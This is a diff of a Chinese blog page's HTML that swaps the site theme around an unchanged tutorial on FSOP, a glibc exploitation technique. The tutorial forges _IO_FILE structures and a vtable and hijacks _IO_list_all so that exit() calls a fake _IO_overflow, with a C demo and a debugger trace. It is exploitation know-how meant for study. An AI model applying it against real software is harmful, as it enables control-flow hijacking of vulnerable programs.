@@ -1,298 +1,89 @@
-
-
-<!DOCTYPE html>
-<html lang="zh-CN" >
-
-<!--浏览器搞笑标题-->
-<script type="text/javascript" src="/js/FunnyTitle.js"></script>
-
-
-
+<!DOCTYPE HTML>
+<html>
 <head>
-  <meta charset="UTF-8">
-  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon/duck.png">
-  <link rel="icon" href="/img/icon/duck.png">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
-  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta charset="utf-8">
   
-  <meta name="theme-color" content="#f58f98">
+  <title>【IO_FILE】FSOP | 鷺雨のBlog</title>
+
+  
   <meta name="author" content="Loora1N">
+  
+
+  
+  <meta name="description" content="Blog of Loora1N">
+  
+
+  
+  
   <meta name="keywords" content="">
   
-    <meta name="description" content="FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_ove">
-<meta property="og:type" content="article">
-<meta property="og:title" content="【IO_FILE】FSOP">
-<meta property="og:url" content="http://loora1n.github.io/2022/11/25/%E3%80%90IO_FILE%E3%80%91FSOP/index.html">
-<meta property="og:site_name" content="鷺雨のBlog">
-<meta property="og:description" content="FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_ove">
-<meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://loora1n.github.io/img/article/fsop/abort_routine.001.jpeg">
-<meta property="article:published_time" content="2022-11-25T11:52:25.847Z">
-<meta property="article:modified_time" content="2022-11-25T11:52:25.847Z">
-<meta property="article:author" content="Loora1N">
-<meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://loora1n.github.io/img/article/fsop/abort_routine.001.jpeg">
-  
-  
-  
-  <title>【IO_FILE】FSOP - 鷺雨のBlog</title>
 
-  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
 
+  <meta property="og:title" content="【IO_FILE】FSOP"/>
 
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
-
-  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
-
-
-
-<!-- 主题依赖的图标库，不要自行修改 -->
-<!-- Do not modify the link that theme dependent icons -->
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
-
-
-
-<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
-
-
-<link  rel="stylesheet" href="/css/main.css" />
-
-
-  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
-  
-
-
+  <meta property="og:site_name" content="鷺雨のBlog"/>
 
   
-<link rel="stylesheet" href="/css/fluid-extention.css">
-<link rel="stylesheet" href="//cdn.jsdelivr.net/gh/bynotes/texiao/source/css/gundongtiao.css">
-
-
-
-  <script id="fluid-configs">
-    var Fluid = window.Fluid || {};
-    Fluid.ctx = Object.assign({}, Fluid.ctx)
-    var CONFIG = {"hostname":"loora1n.github.io","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"❡"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"lftEbNU4XPuR5dgHNV3WdWxP-gzGzoHsz","app_key":"b3uLUVGLeOWDwREWHMBr0jo9","server_url":"https://lftebnu4.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml"};
-
-    if (CONFIG.web_analytics.follow_dnt) {
-      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
-      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
-    }
-  </script>
-  <script  src="/js/utils.js" ></script>
-  <script  src="/js/color-schema.js" ></script>
+  <meta property="og:image" content="/favicon.ico"/>
   
 
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-
-  
-    
-  
-
-
-
-  
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="鷺雨のBlog" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
 <meta name="generator" content="Hexo 6.2.0"></head>
 
 
 <body>
-  
+<div class="blog">
+  <div class="content">
 
-  <header>
-    
-
-<div class="header-inner" style="height: 70vh;">
-  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
-  <div class="container">
-    <a class="navbar-brand" href="/">
-      <strong>鷺雨のBlog</strong>
-    </a>
-
-    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
-            data-target="#navbarSupportedContent"
-            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
-      <div class="animated-icon"><span></span><span></span><span></span></div>
-    </button>
-
-    <!-- Collapsible content -->
-    <div class="collapse navbar-collapse" id="navbarSupportedContent">
-      <ul class="navbar-nav ml-auto text-center">
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/">
-                <i class="iconfont icon-home-fill"></i>
-                首页
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/archives/">
-                <i class="iconfont icon-archive-fill"></i>
-                归档
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/about/">
-                <i class="iconfont icon-user-fill"></i>
-                关于
-              </a>
-            </li>
-          
-        
-          
-          
-          
-          
-            <li class="nav-item">
-              <a class="nav-link" href="/links/">
-                <i class="iconfont icon-link-fill"></i>
-                友链
-              </a>
-            </li>
-          
-        
-        
-          <li class="nav-item" id="search-btn">
-            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
-              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
-            </a>
-          </li>
-          
-        
-        
-      </ul>
-    </div>
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">鷺雨のBlog</a>
+    </h1>
+    <p class="site-description"></p>
   </div>
-</nav>
+  <nav class="site-navigation">
+    <ul>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
 
   
-
-<div id="banner" class="banner" parallax=true
-     style="background: url('/img/bg/3.png') no-repeat center center; background-size: cover;">
-  <div class="full-bg-img">
-    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
-      <div class="banner-text text-center fade-in-up">
-        <div class="h2">
-          
-            <span id="subtitle" data-typed-text="【IO_FILE】FSOP"></span>
-          
-        </div>
-
-        
-          
-  <div class="mt-3">
     
+    <h3 class="article-title"><span>【IO_FILE】FSOP</span></h3>
     
-      <span class="post-meta">
-        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2022-11-25 19:52" pubdate>
-          2022年11月25日 晚上
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a target="_blank" href="//2022/11/25/【IO_FILE】FSOP/" rel="bookmark noopener">
+        <time class="entry-date published" datetime="2022-11-25T11:52:25.847Z">
+          2022-11-25
         </time>
-      </span>
-    
-  </div>
-
-  <div class="mt-1">
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-chart"></i>
-        
-          3.4k 字
-        
-      </span>
-    
-
-    
-      <span class="post-meta mr-2">
-        <i class="iconfont icon-clock-fill"></i>
-        
-        
-        
-          29 分钟
-        
-      </span>
-    
-
-    
-    
-      
-        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
-          <i class="iconfont icon-eye" aria-hidden="true"></i>
-          阅读量 <span id="leancloud-page-views"></span>
-        </span>
-        
-      
-    
+      </a>
+    </span>
   </div>
 
 
-        
-      </div>
+  
 
+  <div class="article-content">
+    <div class="entry">
       
-    </div>
-  </div>
-</div>
-
-</div>
-
-  </header>
-
-  <main>
-    
-      
-
-<div class="container-fluid nopadding-x">
-  <div class="row nomargin-x">
-    <div class="side-col d-none d-lg-block col-lg-2">
-      
-
-    </div>
-
-    <div class="col-lg-8 nopadding-x-md">
-      <div class="container nopadding-x-md" id="board-ctn">
-        <div id="board">
-          <article class="post-content mx-auto">
-            <!-- SEO header -->
-            <h1 style="display: none">【IO_FILE】FSOP</h1>
-            
-            
-              <div class="markdown-body">
-                
-                <blockquote>
+        <blockquote>
 <p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的_IO_FILE 结构会使用_chain 域相互连接形成一个链表，这个链表的头部由_IO_list_all 维护。另外由于网络上很多IO_FILE相关博客含有相关glibc源代码，但是并没有源代码的完整部分或者链接。在之后的博客中，我会包含该段代码在哪里可以查看得到。</p>
 </blockquote>
 <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>FSOP 的核心思想就是劫持_IO_list_all 的值来伪造链表和其中的_IO_FILE 项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用_IO_flush_all_lockp，这个函数会刷新_IO_list_all 链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用_IO_FILE_plus.vtable 中的_IO_overflow。</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L685</span><br><span class="hljs-type">int</span><br>_IO_flush_all_lockp (<span class="hljs-type">int</span> do_lock)<br>&#123;<br>  <span class="hljs-type">int</span> result = <span class="hljs-number">0</span>;<br>  FILE *fp;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_cleanup_region_start_noarg (flush_cleanup);<br>  _IO_lock_lock (list_all_lock);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="hljs-literal">NULL</span>; fp = fp-&gt;_chain)<br>    &#123;<br>      run_fp = fp;<br>      <span class="hljs-keyword">if</span> (do_lock)<br>	_IO_flockfile (fp);<br><br>      <span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>	   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>	       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>	   )<br>	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>	result = EOF;<br><br>      <span class="hljs-keyword">if</span> (do_lock)<br>	_IO_funlockfile (fp);<br>      run_fp = <span class="hljs-literal">NULL</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> _IO_MTSAFE_IO</span><br>  _IO_lock_unlock (list_all_lock);<br>  _IO_cleanup_region_end (<span class="hljs-number">0</span>);<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/genops.c#L685</span></span><br><span class="line"><span class="type">int</span></span><br><span class="line">_IO_flush_all_lockp (<span class="type">int</span> do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  FILE *fp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (fp = (FILE *) _IO_list_all; fp != <span class="literal">NULL</span>; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_flockfile (fp);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (do_lock)</span><br><span class="line">	_IO_funlockfile (fp);</span><br><span class="line">      run_fp = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_MTSAFE_IO</span></span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (<span class="number">0</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="/img/article/fsop/abort_routine.001.jpeg" alt="img"></p>
 <p>而_IO_flush_all_lockp 不需要攻击者手动调用，在一些情况下这个函数会被系统调用：</p>
@@ -304,7 +95,7 @@
 <h2 id="梳理"><a href="#梳理" class="headerlink" title="梳理"></a>梳理</h2><p>梳理一下 FSOP 利用的条件，首先需要攻击者获知 libc.so 基址，因为<code>_IO_list_all </code>是作为全局变量储存在 libc.so 中的，不泄漏 libc 基址就不能改写<code>_IO_list_all</code>。</p>
 <p>之后需要用任意地址写把<code>_IO_list_all</code> 的内容改为指向我们可控内存的指针，</p>
 <p>之后的问题是在可控内存中布置什么数据，毫无疑问的是需要布置一个我们理想函数的 vtable 指针。但是为了能够让我们构造的 fake_FILE 能够正常工作，还需要布置一些其他数据。 这里的依据是我们前面给出的</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (((fp-&gt;_mode &lt;= <span class="hljs-number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)<br>	   || (_IO_vtable_offset (fp) == <span class="hljs-number">0</span><br>	       &amp;&amp; fp-&gt;_mode &gt; <span class="hljs-number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr<br>				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))<br>	   )<br>	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)<br>	result = EOF;<br></code></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</span><br><span class="line">	   || (_IO_vtable_offset (fp) == <span class="number">0</span></span><br><span class="line">	       &amp;&amp; fp-&gt;_mode &gt; <span class="number">0</span> &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">				    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))</span><br><span class="line">	   )</span><br><span class="line">	  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">	result = EOF;</span><br></pre></td></tr></table></figure>
 
 <p>这里其实是两个条件二选一</p>
 <ol>
@@ -317,438 +108,56 @@
 <li>fp-&gt;_IO_write_ptr &gt; fp-&gt; _IO_write_base</li>
 </ul>
 <p>在这里通过一个示例来验证这一点，首先我们分配一块内存用于存放伪造的 vtable 和 _IO_FILE_plus。 为了绕过验证，我们提前获得了 _IO_write_ptr、 _IO_write_base、 _mode 等数据域的偏移，这样可以在伪造的 vtable 中构造相应的数据</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _IO_list_all 0x7ffff7dd2520</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> mode_offset 0xc0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writeptr_offset 0x28</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> writebase_offset 0x20</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> vtable_offset 0xd8</span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">void</span> *ptr;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> *list_all_ptr;<br><br>    ptr=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+mode_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writeptr_offset)=<span class="hljs-number">0x1</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+writebase_offset)=<span class="hljs-number">0x0</span>;<br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+vtable_offset)=((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span>*)((<span class="hljs-type">long</span> <span class="hljs-type">long</span>)ptr+<span class="hljs-number">0x100</span>+<span class="hljs-number">24</span>)=<span class="hljs-number">0x41414141</span>;<br><br>    list_all_ptr=(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)_IO_list_all;<br><br>    list_all_ptr[<span class="hljs-number">0</span>]=ptr;<br><br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_list_all 0x7ffff7dd2520</span><br><span class="line">#define mode_offset 0xc0</span><br><span class="line">#define writeptr_offset 0x28</span><br><span class="line">#define writebase_offset 0x20</span><br><span class="line">#define vtable_offset 0xd8</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">    void *ptr;</span><br><span class="line">    long long *list_all_ptr;</span><br><span class="line"></span><br><span class="line">    ptr=malloc(0x200);</span><br><span class="line"></span><br><span class="line">    *(long long*)((long long)ptr+mode_offset)=0x0;</span><br><span class="line">    *(long long*)((long long)ptr+writeptr_offset)=0x1;</span><br><span class="line">    *(long long*)((long long)ptr+writebase_offset)=0x0;</span><br><span class="line">    *(long long*)((long long)ptr+vtable_offset)=((long long)ptr+0x100);</span><br><span class="line"></span><br><span class="line">    *(long long*)((long long)ptr+0x100+24)=0x41414141;</span><br><span class="line"></span><br><span class="line">    list_all_ptr=(long long *)_IO_list_all;</span><br><span class="line"></span><br><span class="line">    list_all_ptr[0]=ptr;</span><br><span class="line"></span><br><span class="line">    exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>我们使用分配内存的前 0x100 个字节作为_IO_FILE，后 0x100 个字节作为 vtable，在 vtable 中使用 0x41414141 这个地址作为伪造的 _IO_overflow 指针。</p>
 <p>之后，覆盖位于 libc 中的全局变量 _IO_list_all，把它指向我们伪造的 _IO_FILE_plus。</p>
 <p>通过调用 exit 函数，程序会执行 _IO_flush_all_lockp，经过 fflush 获取 _IO_list_all 的值并取出作为 _IO_FILE_plus 调用其中的 _IO_overflow</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">---&gt; call _IO_overflow<br>[#<span class="hljs-number">0</span>] <span class="hljs-number">0x7ffff7a89193</span> → Name: _IO_flush_all_lockp(do_lock=<span class="hljs-number">0x0</span>)<br>[#<span class="hljs-number">1</span>] <span class="hljs-number">0x7ffff7a8932a</span> → Name: _IO_cleanup()<br>[#<span class="hljs-number">2</span>] <span class="hljs-number">0x7ffff7a46f9b</span> → Name: __run_exit_handlers(status=<span class="hljs-number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=<span class="hljs-number">0x1</span>)<br>[#<span class="hljs-number">3</span>] <span class="hljs-number">0x7ffff7a47045</span> → Name: __GI_exit(status=&lt;optimized out&gt;)<br>[#<span class="hljs-number">4</span>] <span class="hljs-number">0x4005ce</span> → Name: main()<br></code></pre></td></tr></table></figure>
-                
-              </div>
-            
-            <hr/>
-            <div>
-              <div class="post-metas my-3">
-  
-  
-</div>
-
-
-              
-  
-
-  <div class="license-box my-3">
-    <div class="license-title">
-      <div>【IO_FILE】FSOP</div>
-      <div>http://loora1n.github.io/2022/11/25/【IO_FILE】FSOP/</div>
-    </div>
-    <div class="license-meta">
-      
-        <div class="license-meta-item">
-          <div>作者</div>
-          <div>Loora1N</div>
-        </div>
-      
-      
-        <div class="license-meta-item license-meta-date">
-          <div>发布于</div>
-          <div>2022年11月25日</div>
-        </div>
-      
-      
-      
-        <div class="license-meta-item">
-          <div>许可协议</div>
-          <div>
-            
-              
-              
-                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
-                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
-                    <i class="iconfont icon-by"></i>
-                  </span>
-                </a>
-              
-            
-          </div>
-        </div>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---&gt; call _IO_overflow</span><br><span class="line">[#<span class="number">0</span>] <span class="number">0x7ffff7a89193</span> → Name: _IO_flush_all_lockp(do_lock=<span class="number">0x0</span>)</span><br><span class="line">[#<span class="number">1</span>] <span class="number">0x7ffff7a8932a</span> → Name: _IO_cleanup()</span><br><span class="line">[#<span class="number">2</span>] <span class="number">0x7ffff7a46f9b</span> → Name: __run_exit_handlers(status=<span class="number">0x0</span>, listp=&lt;optimized out&gt;, run_list_atexit=<span class="number">0x1</span>)</span><br><span class="line">[#<span class="number">3</span>] <span class="number">0x7ffff7a47045</span> → Name: __GI_exit(status=&lt;optimized out&gt;)</span><br><span class="line">[#<span class="number">4</span>] <span class="number">0x4005ce</span> → Name: main()</span><br></pre></td></tr></table></figure>
       
     </div>
-    <div class="license-icon iconfont"></div>
+
   </div>
 
+  <div class="article-footer">
+    <div class="article-meta pull-left">
 
-
-              
-                <div class="post-prevnext my-3">
-                  <article class="post-prev col-6">
-                    
-                    
-                      <a href="/2022/11/29/%E3%80%90IO_FILE%E3%80%91%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86%E6%A6%82%E8%A7%88/" title="【IO_FILE】源码详解">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">【IO_FILE】源码详解</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
-                  </article>
-                  <article class="post-next col-6">
-                    
-                    
-                      <a href="/2022/11/13/%E3%80%90IO_FILE%E3%80%91house%20of%20cat/" title="【IO_FILE】house of cat">
-                        <span class="hidden-mobile">【IO_FILE】house of cat</span>
-                        <span class="visible-mobile">下一篇</span>
-                        <i class="iconfont icon-arrowright"></i>
-                      </a>
-                    
-                  </article>
-                </div>
-              
-            </div>
-
-            
-  <article id="comments">
     
-  <script type="text/javascript">
-    Fluid.utils.loadComments('#comments', function() {
-      var light = 'github-light';
-      var dark = 'github-dark';
-      var schema = document.documentElement.getAttribute('data-user-color-scheme');
-      if (schema === 'dark') {
-        schema = dark;
-      } else {
-        schema = light;
-      }
-      window.UtterancesThemeLight = light;
-      window.UtterancesThemeDark = dark;
-      var s = document.createElement('script');
-      s.setAttribute('src', 'https://utteranc.es/client.js');
-      s.setAttribute('repo', 'loora1n/comment');
-      s.setAttribute('issue-term', 'pathname');
-      
-      s.setAttribute('label', 'utterances');
-      
-      s.setAttribute('theme', schema);
-      s.setAttribute('crossorigin', 'anonymous');
-      document.getElementById('comments').appendChild(s);
-    })
-  </script>
-  <noscript>Please enable JavaScript to view the comments</noscript>
 
-
